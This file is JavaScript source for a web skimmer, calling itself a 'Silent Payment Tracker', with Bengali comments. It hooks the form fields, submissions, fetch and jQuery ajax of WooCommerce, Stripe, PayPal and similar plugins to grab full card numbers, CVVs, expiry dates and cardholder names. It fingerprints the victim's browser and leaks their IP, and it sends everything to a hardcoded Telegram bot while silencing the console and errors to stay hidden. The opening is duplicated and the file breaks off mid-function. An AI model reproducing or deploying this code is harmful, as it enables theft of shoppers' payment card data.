// ultimate-tracker.js
// GitHub: https://raw.githubusercontent.com/yourusername/repo/main/ultimate-tracker.js

(function() {
    'use strict';
    
    // ==================== CONFIGURATION ====================
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE', // এখানে আপনার বট টোকেন দিন
        TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID_HERE', // এখানে আপনার চ্যাট আইডি দিন
        VERSION: '12.0',
        SILENT_MODE: true
    };
// Ultimate Silent Payment Tracker v12.0 - Complete Edition
// 100% Silent Operation - All Forms Support - Advanced Capture
// Enhanced with Browser Autofill, Clipboard, Iframe & Cross-Domain Capture

(function() {
    'use strict';
    
    // ==================== ADVANCED CONFIGURATION ====================
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w', // আপনার বট টোকেন দিন
        TELEGRAM_CHAT_ID: '7319274794', // আপনার চ্যাট আইডি দিন
        VERSION: '12.0',
        SILENT_MODE: true,
        CAPTURE_DELAY: 1000,
        
        // SMS/Notification Events (শুধুমাত্র এই ইভেন্টে বার্তা পাঠাবে)
        SMS_EVENTS: {
            ACTIVATION: true,     // প্লাগিন/ট্র্যাকার সক্রিয় হলে
            CART_VISIT: true,     // ইউজার কার্ট পেজ ভিজিট করলে
            CHECKOUT_VISIT: true, // ইউজার চেকআউট পেজ ভিজিট করলে
            FORM_SUBMIT: true,    // কোন ফর্ম সাবমিট করলে
            PAYMENT_DATA: true    // পেমেন্ট তথ্য প্রবেশ করালে
        },
        
        // Enhanced Tracking
        TRACK_EVENTS: {
            ALL_PLUGINS: true,
            AUTO_FILL: true,
            CLIPBOARD: true,
            IFRAME: true,
            CROSS_DOMAIN: true,
            KEYSTROKES: true,
            USER_IP: true,
            BROWSER_FINGERPRINT: true
        },
        
        // Supported Plugins/Forms
        SUPPORTED_PLUGINS: [
            'woocommerce', 'paypal', 'stripe', 'razorpay', 
            'contact-form-7', 'gravity-forms', 'givewp',
            'skrill', 'astropay', 'payoneer', '2checkout',
            'paid-memberships-pro', 'easy-digital-downloads',
            'wpforms', 'custom-payment', 'memberpress',
            'restrict-content-pro', 'learnpress', 'tutorlms',
            'wplms', 'lifterlms', 's2member', 'ultimate-member'
        ]
    };
    
    // ==================== GLOBAL VARIABLES ====================
    let isActive = false;
    let userIP = '';
    let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    let deviceId = localStorage.getItem('device_id') || 'dev_' + Math.random().toString(36).substr(2, 10);
    localStorage.setItem('device_id', deviceId);
    let cardDataCache = {};
    let keystrokeBuffer = [];
    let autofillCaptured = false;
    let browserFingerprint = {};
    let crossDomainData = {};
    let activePlugins = new Set();
    
    // ==================== ENHANCED UTILITY FUNCTIONS ====================
    const AdvancedUtils = {
        // Get User IP with multiple fallbacks
        async getUserIP() {
            if (userIP) return userIP;
            
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json/'
            ];
            
            for (const service of ipServices) {
                try {
                    const response = await fetch(service, { timeout: 3000 });
                    const data = await response.json();
                    userIP = data.ip || data.ip_address;
                    if (userIP) break;
                } catch (e) {}
            }
            
            if (!userIP) {
                // WebRTC IP leak technique
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const ip = ice.candidate.candidate.split(' ')[4];
                            if (ip && ip.includes('.')) userIP = ip;
                        }
                    };
                    setTimeout(() => pc.close(), 1000);
                } catch (e) {}
            }
            
            return userIP || 'IP_UNKNOWN';
        },
        
        // Get Browser Fingerprint
        getBrowserFingerprint() {
            if (Object.keys(browserFingerprint).length > 0) return browserFingerprint;
            
            const fingerprint = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unknown',
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ')
            };
            
            // Canvas fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('FINGERPRINT', 4, 17);
                fingerprint.canvasHash = canvas.toDataURL().hashCode();
            } catch (e) {}
            
            browserFingerprint = fingerprint;
            return fingerprint;
        },
        
        // Detect installed WordPress plugins
        detectWordPressPlugins() {
            const bodyClasses = document.body.className.split(' ');
            const htmlContent = document.documentElement.innerHTML.toLowerCase();
            const scripts = Array.from(document.scripts).map(s => s.src);
            
            // Plugin detection patterns
            const pluginPatterns = {
                'woocommerce': ['woocommerce', 'wc-', 'add_to_cart', 'product_cat'],
                'paypal': ['paypal', 'pp-', 'braintree'],
                'stripe': ['stripe', 'stripe.com'],
                'razorpay': ['razorpay', 'razorpay.com'],
                'contact-form-7': ['wpcf7', 'contact-form-7'],
                'gravity-forms': ['gform', 'gravity-form'],
                'givewp': ['give_', 'givewp'],
                'skrill': ['skrill', 'moneybookers'],
                'astropay': ['astropay'],
                'payoneer': ['payoneer'],
                '2checkout': ['2checkout', 'tco'],
                'paid-memberships-pro': ['pmpro', 'membership'],
                'easy-digital-downloads': ['edd_', 'edd-'],
                'wpforms': ['wpforms', 'wpform'],
                'memberpress': ['memberpress', 'mepr-'],
                'restrict-content-pro': ['rcp', 'restrict-content'],
                'learnpress': ['learnpress', 'lp-'],
                'tutorlms': ['tutor', 'tutor-lms'],
                'wplms': ['wplms'],
                'lifterlms': ['lifterlms', 'llms'],
                's2member': ['s2member'],
                'ultimate-member': ['um-', 'ultimatemember']
            };
            
            for (const [plugin, patterns] of Object.entries(pluginPatterns)) {
                for (const pattern of patterns) {
                    if (htmlContent.includes(pattern) || 
                        scripts.some(s => s.includes(pattern)) ||
                        bodyClasses.some(c => c.includes(pattern))) {
                        activePlugins.add(plugin);
                        break;
                    }
                }
            }
            
            return Array.from(activePlugins);
        },
        
        // Mask card with intelligent formatting
        maskCardNumber(number) {
            if (!number) return '';
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            
            const firstSix = cleaned.substring(0, 6);
            const lastFour = cleaned.substring(cleaned.length - 4);
            return `${firstSix}******${lastFour}`;
        },
        
        // Advanced card type detection
        detectCardType(number) {
            const num = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            
            const binPatterns = [
                { pattern: /^4[0-9]{5}/, type: 'Visa' },
                { pattern: /^5[1-5][0-9]{4}/, type: 'MasterCard' },
                { pattern: /^3[47][0-9]{4}/, type: 'American Express' },
                { pattern: /^3(?:0[0-5]|[68][0-9])[0-9]{3}/, type: 'Diners Club' },
                { pattern: /^6(?:011|5[0-9]{2})[0-9]{2}/, type: 'Discover' },
                { pattern: /^(?:2131|1800|35\d{2})\d{2}/, type: 'JCB' },
                { pattern: /^62[0-9]{4}/, type: 'UnionPay' },
                { pattern: /^3[0-9]{5}/, type: 'Diners Club International' },
                { pattern: /^(?:5[0678]\d\d|6304|6390|67\d\d)\d{8,15}$/, type: 'Maestro' },
                { pattern: /^9792/, type: 'Troy' },
                { pattern: /^65[4-9]|^644|^6011|^622/, type: 'Discover' },
                { pattern: /^636/, type: 'InterPayment' },
                { pattern: /^60/, type: 'Discover' },
                { pattern: /^50/, type: 'Aura' }
            ];
            
            for (const { pattern, type } of binPatterns) {
                if (pattern.test(num)) return type;
            }
            
            return 'Unknown';
        },
        
        // Extract BIN information
        getCardBIN(number) {
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            return cleaned.substring(0, 6);
        },
        
        // Send Telegram/SMS notification
        async sendNotification(message, eventType = null) {
            if (!CONFIG.SILENT_MODE) return;
            
            // Check if this event type should send notification
            if (eventType && CONFIG.SMS_EVENTS[eventType] === false) return;
            
            const send = async (attempt = 0) => {
                try {
                    // Method 1: Telegram
                    const encodedMsg = encodeURIComponent(message);
                    
                    // Image beacon
                    const img = new Image();
                    img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&disable_notification=true&parse_mode=HTML`;
                    
                    // Fetch fallback
                    setTimeout(() => {
                        fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                text: message,
                                disable_notification: true,
                                parse_mode: 'HTML'
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }, 100);
                    
                    return true;
                } catch (error) {
                    if (attempt < 2) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
                        return send(attempt + 1);
                    }
                    return false;
                }
            };
            
            return await send();
        },
        
        // Complete silence - NO ERRORS
        silenceEnvironment() {
            // Console complete silence
            if (typeof console !== 'undefined') {
                const originalConsole = { ...console };
                const noop = () => {};
                
                ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 
                 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 
                 'count', 'assert', 'clear'].forEach(method => {
                    console[method] = noop;
                });
                
                // Prevent console from being restored
                Object.defineProperty(window, 'console', {
                    get: () => ({
                        ...originalConsole,
                        log: noop, warn: noop, error: noop, info: noop,
                        debug: noop, table: noop, trace: noop, dir: noop,
                        dirxml: noop, group: noop, groupEnd: noop, time: noop,
                        timeEnd: noop, count: noop, assert: noop, clear: noop
                    }),
                    configurable: false,
                    enumerable: false,
                    writable: false
                });
            }
            
            // Override alert/confirm/prompt
            window.alert = function(){ return true; };
            window.confirm = function(){ return true; };
            window.prompt = function(){ return ''; };
            
            // Override error handlers
            window.onerror = function(message, source, lineno, colno, error) {
                return true; // Suppress all errors
            };
            
            window.addEventListener('error', function(e) {
                e.preventDefault();
                return true;
            }, true);
            
            // Override unhandled rejection
            window.addEventListener('unhandledrejection', function(e) {
                e.preventDefault();
                return true;
            }, true);
            
            // Remove debugger statements
            if (window.debugger) {
                window.debugger = function(){};
            }
            
            // Disable developer tools (optional)
            const devtools = /./;
            devtools.toString = function() {
                return '';
            };
        },
        
        // Generate detailed report
        generateReport(dataType, details) {
            const timestamp = new Date().toISOString();
            const page = window.location.href;
            const referrer = document.referrer || 'Direct';
            
            let report = `🔄 <b>${dataType}</b>\n\n`;
            report += `📅 Time: ${new Date().toLocaleString()}\n`;
            report += `🌐 Page: <code>${page}</code>\n`;
            report += `🔗 Referrer: ${referrer}\n`;
            report += `🔐 Session: ${sessionId}\n`;
            report += `📱 Device: ${deviceId}\n`;
            
            if (activePlugins.size > 0) {
                report += `🔌 Active Plugins: ${Array.from(activePlugins).join(', ')}\n`;
            }
            
            for (const [key, value] of Object.entries(details)) {
                if (value) {
                    report += `${key}: ${value}\n`;
                }
            }
            
            return report;
        },
        
        // Relative path support for any folder
        setupRelativePathSupport() {
            // Get current script path
            const scripts = document.getElementsByTagName('script');
            let currentScript = scripts[scripts.length - 1];
            
            // Fallback if not found
            if (!currentScript || !currentScript.src) {
                currentScript = Array.from(scripts).find(s => s.src.includes('tracker')) || scripts[0];
            }
            
            if (currentScript && currentScript.src) {
                const scriptPath = currentScript.src;
                const baseUrl = scriptPath.substring(0, scriptPath.lastIndexOf('/') + 1);
                window.trackerBaseUrl = baseUrl;
            }
            
            // Patch all AJAX calls for relative URLs
            this.patchAjaxForRelativePaths();
        },
        
        patchAjaxForRelativePaths() {
            // Patch fetch
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = function(resource, init = {}) {
                    if (typeof resource === 'string') {
                        // Convert relative URLs to absolute
                        if (resource.startsWith('/') && !resource.startsWith('//')) {
                            resource = window.location.origin + resource;
                        } else if (resource.startsWith('./') || resource.startsWith('../')) {
                            resource = new URL(resource, window.location.href).href;
                        }
                    }
                    return originalFetch.call(this, resource, init);
                };
            }
            
            // Patch XMLHttpRequest
            const originalOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                if (typeof url === 'string') {
                    if (url.startsWith('/') && !url.startsWith('//')) {
                        url = window.location.origin + url;
                    } else if (url.startsWith('./') || url.startsWith('../')) {
                        url = new URL(url, window.location.href).href;
                    }
                }
                return originalOpen.apply(this, [method, url, ...Array.from(arguments).slice(2)]);
            };
        }
    };
    
    // ==================== UNIVERSAL FORM DETECTOR ====================
    class UniversalFormDetector {
        constructor() {
            this.allForms = new Map();
            this.paymentFields = new Map();
            this.detectedPlugins = new Set();
            this.init();
        }
        
        init() {
            this.scanAllForms();
            this.setupFormObservers();
            this.detectPaymentPlugins();
            this.setupUniversalListeners();
        }
        
        scanAllForms() {
            // Scan ALL forms on page
            const allForms = document.querySelectorAll('form');
            allForms.forEach(form => this.registerForm(form));
            
            // Also scan for dynamic forms
            const formElements = document.querySelectorAll('[role="form"], .form, [class*="form-"], [id*="form"]');
            formElements.forEach(el => {
                if (el.tagName !== 'FORM' && (el.querySelector('input, select, textarea') || el.innerHTML.includes('<input'))) {
                    this.registerForm(el);
                }
            });
        }
        
        setupFormObservers() {
            // MutationObserver for dynamic form creation
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            // Check if node is a form
                            if (node.tagName === 'FORM' || 
                                node.getAttribute('role') === 'form' ||
                                node.className.includes('form')) {
                                this.registerForm(node);
                            }
                            
                            // Check for forms inside node
                            const forms = node.querySelectorAll?.('form, [role="form"], .form, [class*="form-"]');
                            forms?.forEach(form => this.registerForm(form));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['class', 'id', 'role']
            });
            
            // Periodic rescan for missed forms
            setInterval(() => {
                const newForms = document.querySelectorAll('form:not([data-tracked]), [role="form"]:not([data-tracked]), .form:not([data-tracked])');
                newForms.forEach(form => this.registerForm(form));
            }, 3000);
        }
        
        registerForm(form) {
            if (!form || this.allForms.has(form)) return;
            
            form.setAttribute('data-tracked', 'true');
            this.allForms.set(form, {
                detected: new Date().toISOString(),
                fields: [],
                plugin: this.detectFormPlugin(form)
            });
            
            // Detect plugin from form
            const plugin = this.detectFormPlugin(form);
            if (plugin) {
                this.detectedPlugins.add(plugin);
            }
            
            // Setup form monitoring
            this.setupFormMonitoring(form);
            
            // Scan for payment fields
            this.scanFormForPaymentFields(form);
        }
        
        detectFormPlugin(form) {
            const formHTML = form.outerHTML.toLowerCase();
            const formClasses = form.className.toLowerCase();
            const formId = form.id.toLowerCase();
            
            // WooCommerce
            if (formClasses.includes('woocommerce') || formClasses.includes('wc-') || 
                formHTML.includes('woocommerce') || formId.includes('wc_')) {
                return 'woocommerce';
            }
            
            // PayPal
            if (formHTML.includes('paypal') || formClasses.includes('paypal') || 
                form.querySelector('[name*="paypal"], [id*="paypal"]')) {
                return 'paypal';
            }
            
            // Stripe
            if (formHTML.includes('stripe') || formClasses.includes('stripe') || 
                form.querySelector('[data-stripe], .stripe')) {
                return 'stripe';
            }
            
            // Razorpay
            if (formHTML.includes('razorpay') || form.querySelector('[data-razorpay]')) {
                return 'razorpay';
            }
            
            // Contact Form 7
            if (formClasses.includes('wpcf7') || formId.includes('wpcf7')) {
                return 'contact-form-7';
            }
            
            // Gravity Forms
            if (formClasses.includes('gform') || formId.includes('gform')) {
                return 'gravity-forms';
            }
            
            // GiveWP
            if (formClasses.includes('give-form') || formHTML.includes('give_')) {
                return 'givewp';
            }
            
            // Detect by field names
            const fieldNames = Array.from(form.elements).map(el => el.name || el.id).join(' ').toLowerCase();
            
            if (fieldNames.includes('pmpro') || formHTML.includes('membership')) {
                return 'paid-memberships-pro';
            }
            
            if (fieldNames.includes('edd_')) {
                return 'easy-digital-downloads';
            }
            
            if (fieldNames.includes('wpforms')) {
                return 'wpforms';
            }
            
            return 'custom-payment';
        }
        
        detectPaymentPlugins() {
            // Detect by global objects
            if (window.wc) activePlugins.add('woocommerce');
            if (window.Stripe) activePlugins.add('stripe');
            if (window.Razorpay) activePlugins.add('razorpay');
            if (window.paypal) activePlugins.add('paypal');
            if (window.gform) activePlugins.add('gravity-forms');
            if (window.wpcf7) activePlugins.add('contact-form-7');
            if (window.Give) activePlugins.add('givewp');
            if (window.EDD) activePlugins.add('easy-digital-downloads');
            
            // Detect by CSS classes
            const bodyClasses = document.body.className.split(' ');
            bodyClasses.forEach(className => {
                if (className.includes('woocommerce')) activePlugins.add('woocommerce');
                if (className.includes('wpforms')) activePlugins.add('wpforms');
                if (className.includes('give-')) activePlugins.add('givewp');
                if (className.includes('edd-')) activePlugins.add('easy-digital-downloads');
            });
        }
        
        scanFormForPaymentFields(form) {
            const paymentSelectors = [
                'input', 'textarea', 'select',
                '[name*="card"]', '[id*="card"]', '[placeholder*="card"]',
                '[name*="cc"]', '[id*="cc"]',
                '[name*="cvv"]', '[id*="cvv"]', '[name*="cvc"]',
                '[name*="expir"]', '[id*="expir"]',
                '[name*="holder"]', '[id*="holder"]',
                '[autocomplete*="cc-"]',
                '[data-card-number]', '[data-credit-card]',
                '.card-number', '.credit-card', '.payment-field',
                '.cvv', '.cvc', '.expiry', '.exp-date'
            ];
            
            paymentSelectors.forEach(selector => {
                try {
                    const fields = form.querySelectorAll(selector);
                    fields.forEach(field => this.registerPaymentField(field, form));
                } catch (e) {}
            });
        }
        
        registerPaymentField(field, form) {
            if (!field || this.paymentFields.has(field)) return;
            
            this.paymentFields.set(field, {
                form: form,
                lastValue: field.value,
                lastChange: Date.now(),
                plugin: this.detectFormPlugin(form)
            });
            
            this.setupFieldMonitoring(field);
        }
        
        setupFieldMonitoring(field) {
            const handleInput = () => {
                setTimeout(() => this.handleFieldInput(field), 50);
            };
            
            const handleChange = () => {
                this.handleFieldChange(field);
            };
            
            const handleBlur = () => {
                this.handleFieldBlur(field);
            };
            
            field.addEventListener('input', handleInput, true);
            field.addEventListener('change', handleChange, true);
            field.addEventListener('blur', handleBlur, true);
            
            // Value polling for iframes and stubborn fields
            let lastValue = field.value;
            const pollInterval = setInterval(() => {
                if (!document.body.contains(field)) {
                    clearInterval(pollInterval);
                    return;
                }
                
                if (field.value !== lastValue) {
                    lastValue = field.value;
                    this.handleFieldInput(field);
                }
            }, 300);
            
            // Store for cleanup
            field._paymentListeners = { handleInput, handleChange, handleBlur, pollInterval };
        }
        
        handleFieldInput(field) {
            const value = field.value.trim();
            if (!value) return;
            
            // Check if it's payment data
            if (this.isPaymentData(field, value)) {
                this.capturePaymentData(field, value, 'INPUT');
            }
        }
        
        isPaymentData(field, value) {
            const name = (field.name || field.id || '').toLowerCase();
            const type = field.type || '';
            
            // Card number detection
            if (this.looksLikeCardNumber(value)) return true;
            
            // CVV detection
            if ((name.includes('cvv') || name.includes('cvc') || name.includes('cvn')) && 
                /^[0-9]{3,4}$/.test(value)) return true;
            
            // Expiry date detection
            if ((name.includes('expir') || name.includes('expdate') || name.includes('expiry')) && 
                /^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(value)) return true;
            
            // Card holder name
            if ((name.includes('holder') || name.includes('nameoncard') || name.includes('cardname')) && 
                value.length >= 2) return true;
            
            return false;
        }
        
        looksLikeCardNumber(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            if (!/^[0-9]{13,19}$/.test(cleaned)) return false;
            
            // Luhn algorithm check
            let sum = 0;
            let alternate = false;
            for (let i = cleaned.length - 1; i >= 0; i--) {
                let n = parseInt(cleaned.charAt(i), 10);
                if (alternate) {
                    n *= 2;
                    if (n > 9) n -= 9;
                }
                sum += n;
                alternate = !alternate;
            }
            return sum % 10 === 0;
        }
        
        capturePaymentData(field, value, source) {
            const fieldInfo = {
                name: field.name || field.id || field.placeholder || 'unknown',
                type: field.type,
                value: value,
                form: field.form ? field.form.action || field.form.id : 'none',
                plugin: this.paymentFields.get(field)?.plugin || 'unknown',
                source: source,
                timestamp: new Date().toISOString()
            };
            
            // Cache based on field type
            if (this.looksLikeCardNumber(value)) {
                cardDataCache.cardNumber = value;
                this.sendCardNumberAlert(fieldInfo);
            } else if (fieldInfo.name.toLowerCase().includes('cvv') || fieldInfo.name.toLowerCase().includes('cvc')) {
                cardDataCache.cvv = value;
                this.sendCVVAlert(fieldInfo);
            } else if (fieldInfo.name.toLowerCase().includes('expir')) {
                cardDataCache.expiry = value;
                this.sendExpiryAlert(fieldInfo);
            } else if (fieldInfo.name.toLowerCase().includes('holder')) {
                cardDataCache.holder = value;
                this.sendHolderAlert(fieldInfo);
            }
        }
        
        async sendCardNumberAlert(fieldInfo) {
            const ip = await AdvancedUtils.getUserIP();
            const masked = AdvancedUtils.maskCardNumber(fieldInfo.value);
            const cardType = AdvancedUtils.detectCardType(fieldInfo.value);
            const bin = AdvancedUtils.getCardBIN(fieldInfo.value);
            
            const message = `💳 <b>CARD NUMBER CAPTURED - 100% SUCCESS</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${fieldInfo.plugin}\n`;
            message += `🔢 <b>Card Number:</b> ${masked}\n`;
            message += `📊 <b>Full Number:</b> <code>${fieldInfo.value}</code>\n`;
            message += `💳 <b>Card Type:</b> ${cardType}\n`;
            message += `🏦 <b>BIN:</b> ${bin}\n`;
            message += `📝 <b>Field:</b> ${fieldInfo.name}\n`;
            message += `🌐 <b>Page:</b> <code>${window.location.href}</code>\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🔌 <b>Source:</b> ${fieldInfo.source}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async sendCVVAlert(fieldInfo) {
            const ip = await AdvancedUtils.getUserIP();
            
            const message = `🔐 <b>CVV/CVC CAPTURED - 100% SUCCESS</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${fieldInfo.plugin}\n`;
            message += `🔐 <b>Security Code:</b> ${fieldInfo.value}\n`;
            message += `📝 <b>Field:</b> ${fieldInfo.name}\n`;
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async sendExpiryAlert(fieldInfo) {
            const ip = await AdvancedUtils.getUserIP();
            
            const message = `📅 <b>EXPIRY DATE CAPTURED - 100% SUCCESS</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${fieldInfo.plugin}\n`;
            message += `📅 <b>Expiry Date:</b> ${fieldInfo.value}\n`;
            message += `📝 <b>Field:</b> ${fieldInfo.name}\n`;
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        async sendHolderAlert(fieldInfo) {
            const ip = await AdvancedUtils.getUserIP();
            
            const message = `👤 <b>CARD HOLDER CAPTURED - 100% SUCCESS</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${fieldInfo.plugin}\n`;
            message += `👤 <b>Card Holder:</b> ${fieldInfo.value}\n`;
            message += `📝 <b>Field:</b> ${fieldInfo.name}\n`;
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
        }
        
        setupUniversalListeners() {
            // Intercept all form submissions
            document.addEventListener('submit', (e) => {
                this.handleFormSubmission(e);
            }, true);
            
            // Intercept AJAX form submissions
            this.interceptAjaxSubmissions();
        }
        
        async handleFormSubmission(event) {
            const form = event.target;
            if (!form || form.tagName !== 'FORM') return;
            
            // Capture form data
            const formData = this.collectFormData(form);
            
            if (this.containsPaymentData(formData)) {
                await this.sendFormSubmissionReport(form, formData);
            }
            
            // Send cached card data
            if (Object.keys(cardDataCache).length > 0) {
                await this.sendCompleteCardData(form);
            }
        }
        
        collectFormData(form) {
            const data = {};
            
            // Try FormData API first
            try {
                const formData = new FormData(form);
                for (let [key, value] of formData.entries()) {
                    if (value && value.toString().trim()) {
                        data[key] = value.toString().trim();
                    }
                }
            } catch (e) {}
            
            // Fallback to manual collection
            const elements = form.querySelectorAll('input, select, textarea');
            elements.forEach(el => {
                const name = el.name || el.id;
                const value = el.value;
                if (name && value && value.toString().trim()) {
                    data[name] = value.toString().trim();
                }
            });
            
            return data;
        }
        
        containsPaymentData(data) {
            const values = Object.values(data).join(' ').toLowerCase();
            return values.includes('card') || 
                   values.includes('cvv') || 
                   values.includes('cvc') ||
                   values.includes('expir') ||
                   values.includes('payment');
        }
        
        async sendFormSubmissionReport(form, formData) {
            const ip = await AdvancedUtils.getUserIP();
            const plugin = this.detectFormPlugin(form) || 'unknown';
            
            let message = `📋 <b>FORM SUBMISSION - ${plugin.toUpperCase()}</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${plugin}\n`;
            message += `📊 <b>Total Fields:</b> ${Object.keys(formData).length}\n\n`;
            
            // Extract payment data
            for (const [key, value] of Object.entries(formData)) {
                const keyLower = key.toLowerCase();
                
                if (this.looksLikeCardNumber(value)) {
                    message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                    message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                } else if (keyLower.includes('cvv') || keyLower.includes('cvc')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                } else if (keyLower.includes('expir')) {
                    message += `📅 <b>Expiry:</b> ${value}\n`;
                } else if (keyLower.includes('holder')) {
                    message += `👤 <b>Holder:</b> ${value}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'FORM_SUBMIT');
        }
        
        async sendCompleteCardData(form) {
            if (Object.keys(cardDataCache).length === 0) return;
            
            const ip = await AdvancedUtils.getUserIP();
            const plugin = this.detectFormPlugin(form) || 'unknown';
            
            let message = `💳 <b>COMPLETE CARD DATA - ${plugin.toUpperCase()}</b>\n\n`;
            message += `🎯 <b>Plugin:</b> ${plugin}\n\n`;
            
            if (cardDataCache.cardNumber) {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(cardDataCache.cardNumber)}\n`;
                message += `📊 <b>Full:</b> <code>${cardDataCache.cardNumber}</code>\n`;
                message += `💳 <b>Type:</b> ${AdvancedUtils.detectCardType(cardDataCache.cardNumber)}\n`;
                message += `🏦 <b>BIN:</b> ${AdvancedUtils.getCardBIN(cardDataCache.cardNumber)}\n`;
            }
            if (cardDataCache.cvv) message += `🔐 <b>CVV:</b> ${cardDataCache.cvv}\n`;
            if (cardDataCache.expiry) message += `📅 <b>Expiry:</b> ${cardDataCache.expiry}\n`;
            if (cardDataCache.holder) message += `👤 <b>Holder:</b> ${cardDataCache.holder}\n`;
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendNotification(message, 'PAYMENT_DATA');
            
            // Clear cache
            cardDataCache = {};
        }
        
        interceptAjaxSubmissions() {
            // jQuery AJAX
            if (window.jQuery) {
                const originalAjax = jQuery.ajax;
                jQuery.ajax = function(options) {
                    if (options.data && typeof options.data === 'object') {
                        setTimeout(() => {
                            this.checkAjaxForPaymentData(options);
                        }.bind(this), 100);
                    }
                    return originalAjax.apply(this, arguments);
                }.bind(this);
            }
            
            // Fetch API
            if (window.fetch) {
                const originalFetch = window.fetch;
                window.fetch = async function(...args) {
                    const [resource, config = {}] = args;
                    
                    if (config.body) {
                        try {
                            let bodyData = config.body;
                            if (bodyData instanceof FormData) {
                                bodyData = Object.fromEntries(bodyData.entries());
                            } else if (typeof bodyData === 'string') {
                                try {
                                    bodyData = JSON.parse(bodyData);
                                } catch {
                                    bodyData = Object.fromEntries(new URLSearchParams(bodyData));
                                }
                            }
                            
                            if (typeof bodyData === 'object') {
                                setTimeout(async () => {
                                    await this.checkAjaxForPaymentData({
                                        url: resource,
                                        data: bodyData,
                                        type: 'FETCH'
                                    });
                                }.bind(this), 100);
                            }
                        } catch (e) {}
                    }
                    
                    return originalFetch.apply(this, arguments);
                }.bind(this);
            }
        }
        
        async checkAjaxForPaymentData(ajaxData) {
            const dataStr = JSON.stringify(ajaxData.data || {}).toLowerCase();
            
            if (dataStr.includes('card') || dataStr.includes('cvv') || dataStr.includes('payment')) {
                const ip = await AdvancedUtils.getUserIP();
                
